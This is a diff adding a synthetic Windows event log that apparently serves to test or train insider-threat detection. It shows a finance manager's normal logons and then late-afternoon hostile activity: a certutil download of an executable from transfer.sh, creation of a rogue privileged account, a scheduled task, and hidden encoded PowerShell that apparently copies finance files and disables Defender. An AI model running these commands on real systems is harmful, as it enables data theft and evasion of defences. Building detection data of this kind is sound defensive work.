@@ -1,0 +1,113 @@
+# =============================================================================
+# Insider Threat — Empleado con acceso legítimo que exfiltra datos
+# Fuente: CISA Insider Threat Advisory, CERT Insider Threat Center Case DB
+# Técnicas MITRE ATT&CK aplicables: T1078, T1136, T1098, T1059.001
+# Duración: día laboral normal + actividad sospechosa en última hora (16:30-17:10)
+# Actor: rgarcia — Finance Manager, con acceso legítimo a sistemas financieros
+# Nota: SIN brute force, SIN IP externa — el caso más difícil de detectar
+# =============================================================================
+
+EventID=4624
+Date/Time=2025-07-03T08:52:11Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Logon Type=2
+Workstation Name=WKSTN-FIN-04
+
+EventID=4624
+Date/Time=2025-07-03T09:15:03Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Logon Type=3
+Workstation Name=SRV-FILE-02
+
+EventID=4624
+Date/Time=2025-07-03T11:30:47Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Logon Type=3
+Workstation Name=SRV-DB-01
+
+EventID=4624
+Date/Time=2025-07-03T14:05:22Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Logon Type=3
+Workstation Name=SRV-FILE-02
+
+EventID=4688
+Date/Time=2025-07-03T16:31:08Z
+Account Name=rgarcia
+Account Domain=FINCO
+New Process ID=0x0f30
+New Process Name=C:\Windows\System32\certutil.exe -urlcache -f http://transfer.sh/get/AbCdEf/exfil_tool.exe C:\Users\rgarcia\AppData\Local\Temp\upd.exe
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=4688
+Date/Time=2025-07-03T16:32:55Z
+Account Name=rgarcia
+Account Domain=FINCO
+New Process ID=0x1a40
+New Process Name=C:\Users\rgarcia\AppData\Local\Temp\upd.exe -compress -archive
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=4720
+Date/Time=2025-07-03T16:35:44Z
+Account Name=svc_backup02
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+
+EventID=4732
+Date/Time=2025-07-03T16:36:18Z
+Account Name=svc_backup02
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+
+EventID=4698
+Date/Time=2025-07-03T16:38:02Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Task Name=\FINCO\Maintenance\DbSyncNightly
+
+EventID=4624
+Date/Time=2025-07-03T16:40:31Z
+Account Name=svc_backup02
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Logon Type=2
+Workstation Name=WKSTN-FIN-04
+
+EventID=4672
+Date/Time=2025-07-03T16:40:58Z
+Account Name=svc_backup02
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Workstation Name=WKSTN-FIN-04
+
+EventID=4688
+Date/Time=2025-07-03T16:43:19Z
+Account Name=rgarcia
+Account Domain=FINCO
+New Process ID=0x2b60
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc UwB0AGEAcgB0AC0AQgBpAHQAUwBlAG4AZABlAHIAIAAtAFMAb3VAcgBjAGUAIABDADoAXABGAGkAbgBhAG4AYwBlAA== -nop -w hidden
+Creator Process Name=C:\Users\rgarcia\AppData\Local\Temp\upd.exe
+
+EventID=4688
+Date/Time=2025-07-03T16:48:37Z
+Account Name=svc_backup02
+Account Domain=FINCO
+New Process ID=0x3c70
+New Process Name=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwA= -nop -exec bypass
+Creator Process Name=C:\Windows\System32\cmd.exe
+
+EventID=4634
+Date/Time=2025-07-03T17:01:04Z
+Account Name=rgarcia
+Account Domain=FINCO
+Source Network Address=10.50.1.88
+Workstation Name=WKSTN-FIN-04
